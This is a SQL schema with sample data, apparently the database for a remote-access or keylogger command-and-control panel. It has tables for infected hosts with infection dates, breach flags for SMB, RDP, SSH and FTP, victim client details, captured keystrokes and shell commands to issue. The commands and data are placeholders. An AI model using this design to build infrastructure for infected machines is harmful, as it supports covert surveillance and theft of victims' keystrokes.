-- Drop tables if they exist
DROP TABLE IF EXISTS "Client" CASCADE;
DROP TABLE IF EXISTS "Host" CASCADE;
DROP TABLE IF EXISTS "Breach" CASCADE;
DROP TABLE IF EXISTS "Keylog" CASCADE; -- Added
DROP TABLE IF EXISTS "KeyStroke" CASCADE; -- Added
DROP TABLE IF EXISTS "Command" CASCADE;

-- Create Host table
CREATE TABLE "Host" (
  "id" SERIAL PRIMARY KEY, -- Changed to SERIAL for auto-incrementing primary key
  "hostname" TEXT NOT NULL,
  "cpu" TEXT NOT NULL,
  "gpu" TEXT NOT NULL,
  "ram" TEXT NOT NULL,
  "storage" TEXT NOT NULL,
  "os" TEXT NOT NULL,
  "infection_date" TIMESTAMP NOT NULL,
  "last_seen" TIMESTAMP NOT NULL,
  "location" TEXT
);

-- Create Breach table
CREATE TABLE "Breach" (
    "id" SERIAL PRIMARY KEY,
    "smb" BOOLEAN NOT NULL DEFAULT FALSE,
    "rdp" BOOLEAN NOT NULL DEFAULT FALSE,
    "ssh" BOOLEAN NOT NULL DEFAULT FALSE,
    "ftp" BOOLEAN NOT NULL DEFAULT FALSE,
    "keyLogger" BOOLEAN NOT NULL DEFAULT FALSE
);

-- Create Client table
CREATE TABLE "Client" (
    "id" SERIAL PRIMARY KEY,
    "ip" TEXT NOT NULL,
    "port" SMALLINT NOT NULL,
    "mac" TEXT NOT NULL,
    "username" TEXT NOT NULL,
    "admin" BOOLEAN NOT NULL DEFAULT FALSE,
    "timezone" INTEGER NOT NULL,
    "host" INTEGER NOT NULL,
    "breach" INTEGER NOT NULL,
    CONSTRAINT "host_fk" FOREIGN KEY ("host") REFERENCES "Host" ("id") INITIALLY DEFERRED,
    CONSTRAINT "breach_fk" FOREIGN KEY ("breach") REFERENCES "Breach" ("id") INITIALLY DEFERRED
);

-- Create Keylog table
CREATE TABLE "Keylog" (
  "id" SERIAL NOT NULL PRIMARY KEY,
  "start_time" TIMESTAMP NOT NULL,
  "end_time" TIMESTAMP NOT NULL,
  "client" INTEGER NOT NULL,
  CONSTRAINT "client_fk" FOREIGN KEY ("client") REFERENCES "Client" ("id") INITIALLY DEFERRED
);

-- Create KeyStroke table
CREATE TABLE "KeyStroke" (
  "id" SERIAL NOT NULL PRIMARY KEY,
  "key" SMALLINT NOT NULL,
  "timestamp" INTEGER NOT NULL,
  "keyState" BOOLEAN NOT NULL,
  "keylog" INTEGER NOT NULL,
  CONSTRAINT "keylog_fk" FOREIGN KEY ("keylog") REFERENCES "Keylog" ("id") INITIALLY DEFERRED
);

-- Create Command table
CREATE TABLE "Command" (  -- Added
  "id" SERIAL NOT NULL PRIMARY KEY,
  "label" TEXT NOT NULL,
  "shell" TEXT NOT NULL,
  "command" TEXT NOT NULL
);

-- Insert sample data into Host
INSERT INTO "Host" ("hostname", "cpu", "gpu", "ram", "storage", "os", "infection_date", "last_seen", "location") VALUES
    ('Host1', 'Intel i7', 'NVIDIA GTX 1080', '16GB', '1TB SSD', 'Windows 10', NOW() - INTERVAL '2 days', NOW(), 'New York, US'),
    ('Host2', 'Intel i5', 'AMD Radeon RX 580', '8GB', '500GB HDD', 'Windows 7', NOW() - INTERVAL '5 days', NOW() - INTERVAL '1 day', 'London, UK'),
    ('Host3', 'Intel i3', 'Intel HD Graphics', '4GB', '250GB HDD', 'Windows XP', NOW() - INTERVAL '1 day', NOW(), 'Paris, FR');

-- Insert sample data into Breach
INSERT INTO "Breach" ("smb", "rdp", "ssh", "ftp", "keyLogger") VALUES
    (TRUE, FALSE, TRUE, FALSE, TRUE),
    (FALSE, TRUE, FALSE, TRUE, TRUE),
    (TRUE, TRUE, FALSE, FALSE, TRUE);

-- Insert sample data into Client
INSERT INTO "Client" ("ip", "port", "mac", "username", "admin", "timezone", "host", "breach") VALUES
    ('192.168.1.100', 8080, '00:1A:2B:3C:4D:5E', 'john_doe', TRUE, -5, 1, 1),
    ('192.168.1.101', 8081, '00:1A:2B:3C:4D:5F', 'jane_smith', FALSE, 0, 2, 2),
    ('192.168.1.102', 8082, '00:1A:2B:3C:4D:60', 'bob_admin', TRUE, 1, 3, 3);

-- Insert sample data into Command
INSERT INTO "Command" ("label", "shell", "command") VALUES
    ('List Files', 'bash', 'ls -la'),
    ('Check Disk Space', 'bash', 'df -h'),
    ('Ping Google', 'cmd', 'ping google.com');

-- Insert 3 rows into Keylog
INSERT INTO "Keylog" ("start_time", "end_time", "client") VALUES
    (NOW() - INTERVAL '30 minutes', NOW() - INTERVAL '20 minutes', 1),
    (NOW() - INTERVAL '40 minutes', NOW() - INTERVAL '30 minutes', 2),
    (NOW() - INTERVAL '50 minutes', NOW() - INTERVAL '40 minutes', 3);

-- Insert 50 rows into KeyStroke for each Keylog
-- Keylog 1
INSERT INTO "KeyStroke" ("key", "timestamp", "keyState", "keylog") VALUES
    (65, 1633024800, TRUE, 1),
    (66, 1633024860, FALSE, 1),
    (67, 1633024920, TRUE, 1),
    (68, 1633024980, FALSE, 1),
    (69, 1633025040, TRUE, 1),
    (70, 1633025100, FALSE, 1),
    (71, 1633025160, TRUE, 1),
    (72, 1633025220, FALSE, 1),
    (73, 1633025280, TRUE, 1),
    (74, 1633025340, FALSE, 1),
    (75, 1633025400, TRUE, 1),
    (76, 1633025460, FALSE, 1),
    (77, 1633025520, TRUE, 1),
    (78, 1633025580, FALSE, 1),
    (79, 1633025640, TRUE, 1),
    (80, 1633025700, FALSE, 1),
    (81, 1633025760, TRUE, 1),
    (82, 1633025820, FALSE, 1),
    (83, 1633025880, TRUE, 1),
    (84, 1633025940, FALSE, 1),
    (85, 1633026000, TRUE, 1),
    (86, 1633026060, FALSE, 1),
    (87, 1633026120, TRUE, 1),
    (88, 1633026180, FALSE, 1),
    (89, 1633026240, TRUE, 1),
    (90, 1633026300, FALSE, 1),
    (65, 1633026360, TRUE, 1),
    (66, 1633026420, FALSE, 1),
    (67, 1633026480, TRUE, 1),
    (68, 1633026540, FALSE, 1),
    (69, 1633026600, TRUE, 1),
    (70, 1633026660, FALSE, 1),
    (71, 1633026720, TRUE, 1),
    (72, 1633026780, FALSE, 1),
    (73, 1633026840, TRUE, 1),
    (74, 1633026900, FALSE, 1),
    (75, 1633026960, TRUE, 1),
    (76, 1633027020, FALSE, 1),
    (77, 1633027080, TRUE, 1),
    (78, 1633027140, FALSE, 1),
    (79, 1633027200, TRUE, 1),
    (80, 1633027260, FALSE, 1),
    (81, 1633027320, TRUE, 1),
    (82, 1633027380, FALSE, 1),
    (83, 1633027440, TRUE, 1),
    (84, 1633027500, FALSE, 1),
    (85, 1633027560, TRUE, 1),
    (86, 1633027620, FALSE, 1),
    (87, 1633027680, TRUE, 1),
    (88, 1633027740, FALSE, 1);

-- Keylog 2
INSERT INTO "KeyStroke" ("key", "timestamp", "keyState", "keylog") VALUES
    (65, 1633027800, TRUE, 2),
    (66, 1633027860, FALSE, 2),
    (67, 1633027920, TRUE, 2),
    (68, 1633027980, FALSE, 2),
    (69, 1633028040, TRUE, 2),
    (70, 1633028100, FALSE, 2),
    (71, 1633028160, TRUE, 2),
    (72, 1633028220, FALSE, 2),
    (73, 1633028280, TRUE, 2),
    (74, 1633028340, FALSE, 2),
    (75, 1633028400, TRUE, 2),
    (76, 1633028460, FALSE, 2),
    (77, 1633028520, TRUE, 2),
    (78, 1633028580, FALSE, 2),
    (79, 1633028640, TRUE, 2),
    (80, 1633028700, FALSE, 2),
    (81, 1633028760, TRUE, 2),
    (82, 1633028820, FALSE, 2),
    (83, 1633028880, TRUE, 2),
    (84, 1633028940, FALSE, 2),
    (85, 1633029000, TRUE, 2),
    (86, 1633029060, FALSE, 2),
    (87, 1633029120, TRUE, 2),
    (88, 1633029180, FALSE, 2),
    (89, 1633029240, TRUE, 2),
    (90, 1633029300, FALSE, 2),
    (65, 1633029360, TRUE, 2),
    (66, 1633029420, FALSE, 2),
    (67, 1633029480, TRUE, 2),
    (68, 1633029540, FALSE, 2),
    (69, 1633029600, TRUE, 2),
    (70, 1633029660, FALSE, 2),
    (71, 1633029720, TRUE, 2),
    (72, 1633029780, FALSE, 2),
    (73, 1633029840, TRUE, 2),
    (74, 1633029900, FALSE, 2),
    (75, 1633029960, TRUE, 2),
    (76, 1633030020, FALSE, 2),
    (77, 1633030080, TRUE, 2),
    (78, 1633030140, FALSE, 2),
    (79, 1633030200, TRUE, 2),
    (80, 1633030260, FALSE, 2),
    (81, 1633030320, TRUE, 2),
    (82, 1633030380, FALSE, 2),
    (83, 1633030440, TRUE, 2),
    (84, 1633030500, FALSE, 2),
    (85, 1633030560, TRUE, 2),
    (86, 1633030620, FALSE, 2),
    (87, 1633030680, TRUE, 2),
    (88, 1633030740, FALSE, 2);

-- Keylog 3
INSERT INTO "KeyStroke" ("key", "timestamp", "keyState", "keylog") VALUES
    (65, 1633030800, TRUE, 3),
    (66, 1633030860, FALSE, 3),
    (67, 1633030920, TRUE, 3),
    (68, 1633030980, FALSE, 3),
    (69, 1633031040, TRUE, 3),
    (70, 1633031100, FALSE, 3),
    (71, 1633031160, TRUE, 3),
    (72, 1633031220, FALSE, 3),
    (73, 1633031280, TRUE, 3),
    (74, 1633031340, FALSE, 3),
    (75, 1633031400, TRUE, 3),
    (76, 1633031460, FALSE, 3),
    (77, 1633031520, TRUE, 3),
    (78, 1633031580, FALSE, 3),
    (79, 1633031640, TRUE, 3),
    (80, 1633031700, FALSE, 3),
    (81, 1633031760, TRUE, 3),
    (82, 1633031820, FALSE, 3),
    (83, 1633031880, TRUE, 3),
    (84, 1633031940, FALSE, 3),
    (85, 1633032000, TRUE, 3),
    (86, 1633032060, FALSE, 3),
    (87, 1633032120, TRUE, 3),
    (88, 1633032180, FALSE, 3),
    (89, 1633032240, TRUE, 3),
    (90, 1633032300, FALSE, 3),
    (65, 1633032360, TRUE, 3),
    (66, 1633032420, FALSE, 3),
    (67, 1633032480, TRUE, 3),
    (68, 1633032540, FALSE, 3),
    (69, 1633032600, TRUE, 3),
    (70, 1633032660, FALSE, 3),
    (71, 1633032720, TRUE, 3),
    (72, 1633032780, FALSE, 3),
    (73, 1633032840, TRUE, 3),
    (74, 1633032900, FALSE, 3),
    (75, 1633032960, TRUE, 3),
    (76, 1633033020, FALSE, 3),
    (77, 1633033080, TRUE, 3),
    (78, 1633033140, FALSE, 3),
    (79, 1633033200, TRUE, 3),
    (80, 1633033260, FALSE, 3),
    (81, 1633033320, TRUE, 3),
    (82, 1633033380, FALSE, 3),
    (83, 1633033440, TRUE, 3),
    (84, 1633033500, FALSE, 3),
    (85, 1633033560, TRUE, 3),
    (86, 1633033620, FALSE, 3),
    (87, 1633033680, TRUE, 3),
    (88, 1633033740, FALSE, 3);
